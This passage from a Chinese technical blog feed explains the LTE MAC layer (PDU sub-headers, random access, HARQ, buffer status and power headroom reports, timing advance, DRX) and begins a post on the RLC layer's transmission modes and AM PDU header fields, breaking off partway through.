        
    </a><figcaption class="image-caption">下行信道映射</figcaption>
    </figure>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_10.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_10.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_10.webp" data-sub-html="<h2>上行信道映射</h2>">
        
    </a><figcaption class="image-caption">上行信道映射</figcaption>
    </figure>
<h3 id="mac-协议数据单元格式">MAC 协议数据单元格式</h3>
<p><code>MAC 包头</code>可以包含多个子包头，每个子包头对应于 <code>MAC PDU</code> 负荷部分的 1 个 <code>MAC 控制单元</code>、<code>MAC SDU</code> 或者填充比特字段。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_11.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_11.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_11.webp" data-sub-html="<h2>MAC 协议数据单元 PDU 的格式</h2>">
        
    </a><figcaption class="image-caption">MAC 协议数据单元 PDU 的格式</figcaption>
    </figure>
<p>子包头的格式如图所示：</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_12.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_12.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_12.webp" data-sub-html="<h2>MAC 层的子包头</h2>">
        
    </a><figcaption class="image-caption">MAC 层的子包头</figcaption>
    </figure>
<ul>
<li><code>R</code>（Reserve）字段为保留字段，数值设为 <code>0</code></li>
<li><code>E</code>（Extension）字段指示本子包头后面是否还有其他的子包头，或者是包头部分已经结束，将要开始 <code>MAC 控制单</code>元或者 MAC SDU 的传输</li>
<li><code>LCID</code>（Logical Channel ID）字段指示 <code>MAC SDU</code> 所属逻辑信道的标识、<code>MAC 控制单元</code>的类型或者是填充比特</li>
<li><code>F</code>（Format）字段指示随后的 <code>L</code> 字段的长度，7 个比特或者 15 个比特</li>
<li><code>L</code>（Length）字段指示与子包头相对应的 <code>MAC SDU</code> 或者 <code>MAC 控制单元</code>的字节长度</li>
</ul>
<h3 id="mac-层功能和-mac-控制单元">MAC 层功能和 MAC 控制单元</h3>
<p>下面介绍 MAC 层的主要功能，以及在完成这些功能过程中所需要的 MAC 控制单元。</p>
<h4 id="随机接入过程">随机接入过程</h4>
<p>随机接入是由 MAC 层控制的一项功能，空闲状态的终端通过随机接入过程与网络建立连接。</p>
<p>首先建立<strong>执行控制功能的连接</strong>（即 <code>RRC 连接</code>），终端由空闲状态转变为连接状态$\Longrightarrow$然后通过 <code>RRC 控制功能</code>建立数据通信的连接，开始进行数据的通信。(对于连接状态的终端，也可能因为长时间没有发送上行信号而失去上行同步，此时如果有数据需要进行发送，终端需要进行随机接入的过程，与基站重新建立上行同步。随机接入过程可以由终端发起，也可以由网络侧通过物理层下行控制信道（PDCCH）触发终端发起随机接入)</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_13.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_13.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_13.webp" data-sub-html="<h2>随机接入过程</h2>">
        
    </a><figcaption class="image-caption">随机接入过程</figcaption>
    </figure>
<p>在随机接入过程中，终端选择 1 个随机接入序列通过物理层随机接入信道（PRACH）进行发送（在网络侧触发的情况下，由触发消息指示终端所使用的随机接入序列）$\Longrightarrow$基站检测到随机接入序列的信号后，在下行方向上发送随机接入响应，该消息指示了：</p>
<ul>
<li>基站所检测到的随机接入序列的编号</li>
<li>发起随机接入的终端分配的上行资源位置</li>
<li>上行信号发送时间的调整量</li>
</ul>
<h5 id="冲突解决">冲突解决</h5>
<p>如果多个终端选择了<strong>相同的随机接入序列</strong>并且在<strong>相同的时间</strong>进行发送，那么多个终端可能针对随机接入响应的接收发生冲突，所以需要冲突解决的过程。</p>
<p>在收到随机接入响应的消息后，终端根据消息指示的内容进行上行信号的发送（又称为“消息 3”），对应于图中的步骤 3，该信号中可能包含终端的唯一标识。随后基站根据接收到的上行信息，向唯一标识所对应的成功接入的终端返回冲突解决消息，完成冲突解决的过程。</p>
<ul>
<li>
<p>小区无线网络临时标识。</p>
<p>收到基站的随机接入响应消息后，终端发送上行消息（即<code>消息 3</code>）开始冲突解决的过程。对于连接状态的终端发起随机接入过程的情况，该消息中包含终端的唯一标识：小区无线网络临时标识（Cell-Radio Network Temporary Identifier，C-RNTI）。具体来说，“消息 3”中使用 <code>MAC 控制单元</code>来指示 <code>C-RNTI</code> 的信息。</p>
<p><code>C-RNTI</code> 的 <code>MAC 控制单元</code>仅包含一个字段，即 16 比特 <code>C-RNTI</code>。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_14.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_14.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_14.webp" data-sub-html="<h2>MAC 控制单元——C-RNTI</h2>">
        
    </a><figcaption class="image-caption">MAC 控制单元——C-RNTI</figcaption>
    </figure>
</li>
<li>
<p>终端冲突解决标识。</p>
<p>在上行随机接入过程中，终端发送上行消息（即<code>消息 3</code>）开始冲突解决的过程，对于连接状态的终端发起随机接入的情况，“消息 3”中指示终端的唯一标识 <code>C-RNTI</code>，在随后的下行发送中，网络通过物理层<code>下行控制信道</code>（PDCCH）指示该 <code>C-RNTI</code> 即可完成冲突解决。在另一种情况下，对于空闲状态的终端发起随机接入过程的情况，网络在随机接入响应消息中向终端分配<code>临时 RNTI</code>，但是因为还存在可能发生冲突的情况，所以在随后的<code>消息 3</code>中终端不使用<code>临时 RNTI</code>，而是传输<code>上行公用控制信道</code>（CCCH）的 <code>RRC</code> 连接建立请求消息。与此相对应的，基站在随后的下行发送中通过终端冲突解决标识的 <code>MAC 控制单元</code>完成冲突解决的过程。成功地完成冲突解决之后，终端将使用网络分配的<code>临时 RNTI</code>作为 <code>C-RNTI</code>。</p>
<p>终端冲突解决标识的 <code>MAC 控制单元</code>仅包含一个字段：<code>终端冲突解决标识</code>，这个字段包含上行随机接入冲突解决过程中，终端在<code>消息 3</code>中发送的<code>上行公用控制信道</code>的服务数据单元（CCCH SDU）。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_15.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_15.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_15.webp" data-sub-html="<h2>MAC 控制单元——终端冲突解决标识</h2>">
        
    </a><figcaption class="image-caption">MAC 控制单元——终端冲突解决标识</figcaption>
    </figure>
</li>
</ul>
<h4 id="数据的调度和传输">数据的调度和传输</h4>
<p><strong>数据的调度和传输</strong>是 MAC 层控制的另一项主要功能。</p>
<p>对于数据信息的传输，即传输信道中的上行／下行共享信道（DL/UL-SCH），可以根据无线信道状态将无线资源在用户间进行自适应的调度分配，实现系统资源的优化利用，同时满足各个用户的 <code>QoS</code> 要求。主要采用<code>动态调度</code>的方式，也支持<code>半持续调度</code>（Semi-Persistent Scheduling，SPS）的方式。</p>
<ul>
<li>动态调度的情况下，根据无线信道状态和用户优先级等信息，基站按照长度等于 1ms 的 <code>TTI</code> 作为单位，在每个 1ms 对各个终端所使用的无线资源进行分配，并且选择合适的数据传输格式</li>
<li>半持续调度的情况下，基站一次性为终端分配较长时间的无线资源，可以节省进行资源调度的控制信息</li>
</ul>
<h5 id="半持续调度">半持续调度</h5>
<p>LTE 支持<code>半持续</code>（Semi-Persistent Scheduling，SPS）的调度方式。对于某些业务量不大而且比较规则的业务（例如 VoIP），一次性的对较长时间内的资源使用进行分配，而不需要在每次传输的时候都进行动态分配，通过这样的机制，节省了为终端进行资源调度的 <code>PDCCH</code> 控制信令的开销。</p>
<p>对于半持续调度，为了减小调度信令的开销，基站一次为终端分配一段时间内预先定义好的无线资源和相应的传输格式，主要参数是<code>半持续调度的时间间隔</code>。例如，根据 VoIP 业务的流量特点，设置半持续调度的时间间隔等于 20ms，为用户分配一段时间内间隔为 20ms、相同频域位置和大小的无线资源。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_16.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_16.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_16.webp" data-sub-html="<h2>半持续调度</h2>">
        
    </a><figcaption class="image-caption">半持续调度</figcaption>
    </figure>
<h5 id="harq">HARQ</h5>
<p>MAC 层采用混合自动重传（Hybrid Automatic Repeat reQuest，HARQ）的数据纠错机制。设置多个并行的<code>停——等</code>机制的 HARQ 进程，每个进程独立地进行数据包的重传和合并。多个并行的进程保证数据包传输的工作效率，重传保证了数据包传输的正确性，同时合并的处理还可以提供额外的性能增益。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_17.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_17.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_17.webp" data-sub-html="<h2>多个并行的 停——等 机制的 HARQ 进程</h2>">
        
    </a><figcaption class="image-caption">多个并行的 停——等 机制的 HARQ 进程</figcaption>
    </figure>
<p>在下行的数据传输中，每个 <code>HARQ</code> 进程内部采用<code>异步</code>、<code>自适应</code>的机制。</p>
<ul>
<li>异步指的是对于 1 个数据包的多次传输（包括第一次的初传和随后可能的多次重传），各次传输之间没有固定的定时关系。也就是说，对于需要重传的数据包，在满足与这个数据包上一次传输之间的时间间隔不小于规定的最小值（8ms）的条件的基础上，调度器可以灵活地选择进行重传的时间</li>
<li>自适应指的是在各次传输之间，调度器可以灵活地选择不同位置／大小的物理资源，以及不同的传输格式（包括调制方式和信道编码速率等）</li>
</ul>
<p>与异步、自适应的 <code>HARQ</code> 机制相匹配，下行数据包的传输伴随有下行调度信令，调度信令中指示当前所传输的下行数据包的资源位置、传输格式和所对应的 <code>ARQ</code> 进程号码，用户终端通过检测下行调度信令，可以进行下行数据包的接收、重传数据包的合并以及数据解调的操作</p>
<p>对于上行数据的传输，每个 <code>HARQ</code> 进程内部采用同步的机制。与下行方向采用的异步机制不同，上行采用的同步机制指的是对于上行 <code>HARQ</code> 过程中一个数据包的多次传输（包括第一次的初传和随后可能的多次重传），各次传输之间采用固定的定时关系。</p>
<blockquote>
<p>例如：在时刻 0 进行初传的数据包，如果出现接收错误需要进行重新传输，那么第一次重传将发生在时刻 8，如果仍然接收错误需要继续重传，那么第二次重传将发生在时刻 16，以此类推。根据这样的同步的定时关系，对于上行 HARQ 过程的数据重新传输，基站可以不对重传的数据包进行调度。此时，终端仅收到网络侧基站反馈的关于数据接收出错的消息，终端将根据固定的定时关系，在规定的时间采用与第一次传输相同的频率资源位置和传输格式进行重传，这种方式称为同步、非自适应的 HARQ 机制。</p>
</blockquote>
<p>上行方向还可以支持同步、自适应的 <code>HARQ</code> 机制，网络侧基站反馈关于数据接收出错的消息的同时可以发送对于重传数据包的上行调度信息，该调度信息不改变重传数据包的传输时间，即仍然是同步的机制，但是可以调度不同位置和大小的频率资源，以及不同的传输格式，也就是说，实现自适应的 <code>HARQ</code> 机制。</p>
<h5 id="上行缓存状态报告">上行缓存状态报告</h5>
<p>终端的上行发送是根据基站的调度进行的，因此，终端的缓存中等待进行发送的数据的数量是基站进行调度时需要的参考信息。</p>
<blockquote>
<p>例如，如果终端的缓存中没有等待发送的数据，那么基站就不应该对该终端进行上行发送的调度。</p>
</blockquote>
<p>终端通过发送缓存状态报告（Buffer Status Report，BSR），向服务基站报告终端的上行缓存中等待发送的数据的数量。根据 <code>RRC 信令</code>的配置，终端将上行逻辑信道进行分组，采用逻辑信道组（Logical Channel Group，LCG）为单位进行缓存状态的报告。</p>
<p>终端缓存状态报告的 <code>MAC 控制单元</code>包括两种格式——<code>短格式／截断格式</code>，或者<code>长格式</code>。</p>
<ul>
<li>短格式进行 1 个逻辑信道组对应的缓存状态报告，相应的 <code>MAC 控制单</code>元由逻辑信道组标识（LCG ID）和缓存数据量大小组成</li>
<li>长格式进行 4 个逻辑信道组的缓存状态报告，发送的 4 个关于缓存大小的消息分别对应于编号 0 到编号 3 的 4 个逻辑信道组</li>
</ul>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_18.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_18.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_18.webp" data-sub-html="<h2>MAC 控制单元——缓存状态报告</h2>">
        
    </a><figcaption class="image-caption">MAC 控制单元——缓存状态报告</figcaption>
    </figure>
<h5 id="功率余量报告">功率余量报告</h5>
<p>上行信号的发送受到终端最大发射功率的限制，所以基站在调度终端进行上行发送的时候需要参考终端发射功率的情况。</p>
<blockquote>
<p>例如：如果终端处于小区边缘，已经接近最大发射功率的限制，在这种情况下，基站如果调度这个终端使用大量资源进行大数据量的上行发送，而终端由于最大发射功率的限制可能无法保证发射信号的质量，因而导致信息传输的错误。所以基站需要根据对终端发射功率情况的了解，避免出现这样的情况。</p>
</blockquote>
<p>通过功率余量报告，终端向基站报告上行数据信道当前的发射功率距离终端上行最大发射功率之间的余量，该信息作为基站进行上行功率控制和上行资源调度的参考。功率余量报告的传输由 <code>RRC 信令</code>进行配置，包括周期性的方式或者传播损耗的变化超过设定的门限都可以触发功率余量消息的上报。</p>
<p>功率余量报告的 <code>MAC 控制单元</code>包括 2 个比特的预留字段和 6 个比特的功率余量（Power Headroom，PH）信息，指示从 −23dB 到 40dB 范围之内的数值。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_19.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_19.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_19.webp" data-sub-html="<h2>MAC 控制单元——功率余量报告</h2>">
        
    </a><figcaption class="image-caption">MAC 控制单元——功率余量报告</figcaption>
    </figure>
<h4 id="上行时间同步的保持">上行时间同步的保持</h4>
<p>在下行方向上，终端通过检测基站的同步和导频信号，与基站下行信号的发送时间取得同步，实现下行信号的接收。与此相类似，为了实现上行信号的传输，终端需要与基站取得上行方向的同步。在获得上行同步的过程中，终端根据基站的指示调整上行信号的发送时间，使得无论终端距离基站是远或者是近，它们发送的上行信号到达基站的时间是对齐的，并且符合基站的定时关系，这样方便基站对用户信号的接收，以及对多个用户信号之间干扰的管理和控制。</p>
<ul>
<li>对于<strong>空闲状态</strong>或者处于<strong>连接状态但上行已经失去同步</strong>的终端，需要通过上行随机接入过程，获得上行同步。</li>
<li>对处于<strong>连接状态</strong>，上行没有失去同步的终端，基站使用 MAC 控制单元向终端指示定时提前（Time Advanced，TA）命令，对终端的上行发送时间进行调整，实现终端与系统之间上行时间同步的保持。</li>
</ul>
<p>定时提前命令的 <code>MAC 控制单元</code>包括 2 个比特的预留字段和 6 个比特的 TA 命令信息。定时调整的精度是 16Ts ，即 16×1/(15×1 000×2 048)s 约等于 0.52μs。因为 6 个比特 TA 命令表示的是从 −31 到+32 的范围，所以每个定时提前命令能够调整的时间范围是 −16.15 ～+16.67μs。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_20.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_20.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_20.webp" data-sub-html="<h2>MAC 控制单元——定时提前命令</h2>">
        
    </a><figcaption class="image-caption">MAC 控制单元——定时提前命令</figcaption>
    </figure>
<h4 id="不连续接收功能">不连续接收功能</h4>
<p><strong>不连续接收</strong>（Discontinuous Reception，DRX）是一种用于实现<strong>终端省电</strong>的功能。</p>
<p>根据 <code>RRC 信令</code>进行配置的 <code>DRX</code> 功能，可以对处于连接状态的终端监测物理层<code>下行控制信道</code>（PDCCH）的方式进行控制。在不使用 <code>DRX</code> 功能的时候，终端需要对 <code>PDCCH</code> 信道进行连续的监测，在每一个 <code>TTI</code>（1ms），终端都需要对 <code>PDCCH</code> 信道进行监测，寻找其中可能属于自己的数据调度信息。通过配置 <code>DRX</code> 功能，设置了<code>激活”时间</code>和<code>休眠时间</code>。</p>
<ul>
<li>在激活的时间里，终端需要对 <code>PDCCH</code> 信道进行监测</li>
<li>在休眠的时间中，终端不需要对 <code>PDCCH</code> 信道进行监测，基站也不会向该终端进行数据传输的调度，所以可以节省终端的耗电。</li>
</ul>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_21.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_21.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_21.webp" data-sub-html="<h2>不连续接收（DRX）功能</h2>">
        
    </a><figcaption class="image-caption">不连续接收（DRX）功能</figcaption>
    </figure>
<p>关于终端使用 <code>DRX</code> 功能的过程，首先通过高层 RRC 信令对终端设置 <code>DRX</code> 的相关配置，包括 <code>DRX 周期</code>、激活和休眠时间等。在工作过程中，采用 <code>MAC 层控制信令</code>开启或者关闭终端的 <code>DRX</code> 功能。<code>MAC 层</code> <code>DRX</code> 命令采用类型为 <code>DRX</code> 命令的 <code>MAC 控制单元</code>进行指示，所对应的 <code>MAC PDU</code> 子包头指示 MAC 控制单元的类型是 <code>DRX</code> 命令，因为除了指示存在 <code>DRX</code> 命令之外，不需要其他的信息，所以相应的 <code>MAC 控制单元</code>部分的长度是 <code>0</code>。</p>
<h2 id="参考">参考</h2>
<ul>
<li>[1] LTE-Advanced 关键技术详解</li>
</ul>]]></description>
</item><item>
    <title>LTE 系列：RLC 层详解</title>
    <link>https://www.techkoala.top/lte_rlc/</link>
    <pubDate>Mon, 31 Aug 2020 21:00:26 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://www.techkoala.top/lte_rlc/</guid>
    <description><![CDATA[<blockquote>
<p>LTE RLC 层详解</p>
</blockquote>
<h2 id="无线链路控制rlc">无线链路控制（RLC）</h2>
<p>无线链路控制（Radio Link Control，RLC）层的主要功能是：</p>
<ul>
<li>根据下层指示的数据包传输大小对来自上层的数据包进行连接、分段和重组</li>
<li>数据包的顺序传输和重复性检测</li>
<li>自动重传请求（Automatic Repeat Request，ARQ）的数据纠错</li>
</ul>
<p>针对<strong>每一个</strong>无线承载配置一个 <code>RLC 实体</code>，经过 <code>RLC</code> 层协议功能的处理后，数据以逻辑信道的方式输出到下层的 <code>MAC 层</code>。根据所传输消息的不同特点，<code>RLC 实体</code>有 3 种工作模式：</p>
<ul>
<li><strong>透明模式</strong>（Transparent Mode，TM）</li>
<li><strong>确认模式</strong>（Acknowledged Mode，AM）</li>
<li><strong>非确认模式</strong>（Unacknowledged Mode，UM）</li>
</ul>
<h3 id="透明模式tm">透明模式（TM）</h3>
<p>此模式下，<code>RLC</code> 子层是完全透明的，<strong>不执行任何功能</strong>，例如不添加 <code>RLC 包头</code>、不进行数据分段或者连接，即来自上层的数据在 <code>RLC</code> 层<strong>不进行任何处理</strong>，“透明”地传输到下层的 <code>MAC 层</code>。透明模式用于广播、寻呼和公用控制信道等信息需要传输给多个用户的情况，相对应于广播、上下行公用控制和寻呼等逻辑信道。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_4.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_4.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_4.webp" data-sub-html="<h2>TM 模式数据消息的 RLC PDU 格式</h2>">
        
    </a><figcaption class="image-caption">TM 模式数据消息的 RLC PDU 格式</figcaption>
    </figure>
<h3 id="确认模式am">确认模式（AM）</h3>
<p>此模式用于提供高可靠性的数据传输服务，例如 <code>TCP/IP</code> 数据业务或者 <code>RRC</code> 控制信令的传输，包括承载上下行专用数据信息和专用控制信息的逻辑信道。</p>
<p>在此模式下，<code>RLC 子层</code><strong>执行所有功能</strong>，包括：</p>
<ul>
<li>数据包的连接、分段和重组</li>
<li>数据包的顺序传输和重复性检测</li>
<li>基于滑动窗进行错误数据包重新传输的 ARQ 纠错机制</li>
</ul>
<p><code>AM 模式</code>的 <code>RLC PDU</code> 由 <code>RLC 包头</code>和 <code>RLC SDU</code> 组成，<code>RLC 包头</code>包括 <code>D/C</code>，<code>RF</code>，<code>P</code>，<code>FI</code>， <code>E</code> 和 <code>SN</code> 字段。如果 <code>RLC PDU</code> 中包含多于 1 个数据字段，那么相对应的 <code>RLC 包头</code>还将包括 <code>E</code> 和 <code>LI</code> 字段，以分别对应于各个数据字段。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_5.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_5.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_5.webp" data-sub-html="<h2>AM 模式数据消息的 RLC PDU 格式</h2>">
        
    </a><figcaption class="image-caption">AM 模式数据消息的 RLC PDU 格式</figcaption>
    </figure>
<p>以下是 <code>RLC 包头</code>各个字段的具体含义:</p>
<ul>
<li><code>D/C</code>（Data/Control）字段：指示该 <code>RLC PDU</code> 是<code>RLC 数据 PDU</code>还是<code>RLC 控制 PDU</code></li>
<li><code>RF</code>（Re-segmentation Flag）字段：指示该 <code>RLC PDU</code> 是一个 <code>AM 模式``PDU</code>，还是一个 <code>AM 模式</code>的 <code>PDU 分段</code>。因为，在 <code>AM</code> 模式的情况，数据包进行 <code>ARQ</code> 重传的时候，可能需要对初次传输时的 <code>AM PDU</code> 进行分段，因而形成 <code>AM PDU 分段</code></li>
<li><code>P</code>（Polling）字段指示是否要求接收端对等的 <code>RLC 实体</code>进行 1 次 <code>RLC 状态</code>的报告</li>
<li><code>FI</code>（Framing Indicator）字段：指示 <code>RLC PDU </code>的数据字段是否是 <code>RLC SDU</code> 的开始或者结尾部分。2 个比特的信息指示了<strong>是开始不是结尾</strong>、<strong>是结尾不是开始</strong>、<strong>既不是结尾也不是开始</strong>、<strong>既包含了结尾也包含了开始</strong>一共 4 种可能的状态</li>
<li><code>E</code>（Extension）字段指示后面是否还有 <code>E</code> 和 <code>LI</code> 字段</li>
<li><code>SN</code>（Sequence Number）字段：指示 <code>RLC PDU</code> 的序号，序号采用递增的方式。对于 <code>AM 模式</code>下重传的 <code>AM PDU</code> 或者 <code>AM PDU 分段</code>，采用初传的 AM PDU 所对应的序号</li>
<li><code>LI</code>（Length Indicator）字段：指示对应的数据字段的字节长度</li>
</ul>
<p>在 <code>AM 模式</code>下，<code>RLC</code> 层使用 <code>ARQ</code> 纠错机制对传输错误的数据包进行重传，由于下层指示的数据包传输大小可能与初次传输时候的情况有所不同，可能需要对初次传输的 <code>AM PDU</code> 进行分段，因此形成了<code>AM PDU 分段</code>的格式。与 <code>AM PDU</code> 相比较，<code>AM PDU</code> 分段在包头部分多了两个字段：<code>LSF</code> 和 <code>SO</code>。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_6.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_6.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_6.webp" data-sub-html="<h2>AM 模式数据消息的 RLC PDU 分段的格式</h2>">
        
    </a><figcaption class="image-caption">AM 模式数据消息的 RLC PDU 分段的格式</figcaption>
    </figure>
<ul>
<li><code>LSF</code>（Last Segment Flag）字段指示这个 <code>AM PDU</code> 分段是否是所对应的初次传输的 <code>AM PDU</code> 的最后一个分段。</li>
<li><code>SO</code>（Segment Offset）字段指示这个 <code>AM PDU</code> 分段在所对应的初次传输的 <code>AM PDU</code> 中的位置，具体<strong>是这个 AM PDU 分段的第 1 个字节</strong>在所对应的初次传输的 <code>AM PDU</code> 中的字节位置。</li>
</ul>
<p>除了 <code>RLC 数据 PDU</code> 之外，<code>AM 模式</code>下还可能传输 <code>RLC 控制 PDU</code>，进行 <code>RLC 状态</code>的报告。由数据接收方的 <code>RLC 实体</code>向数据发送方对等的 <code>RLC 实体</code>发送 <code>RLC 状态 PDU</code>，报告 <code>AM PDU</code> 数据包的接收状态，包括正确接收的数据包的最后序号，以及接收错误的数据包的序号。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_7.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_7.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_7.webp" data-sub-html="<h2>RLC 状态 PDU</h2>">
        
    </a><figcaption class="image-caption">RLC 状态 PDU</figcaption>
    </figure>
<ul>
<li><code>CPT</code>（Control PDU Type）字段指示该 <code>RLC 控制 PDU</code> 的类型</li>
<li><code>ACK_SN</code>（Acknowledgement SN）字段指示接收正确的数据包的最后一个序列号，不包含 <code>ACK_SN</code> 本身所指示的数据包，以及由 <code>NACK_SN</code> 所指出的接收错误的数据包</li>
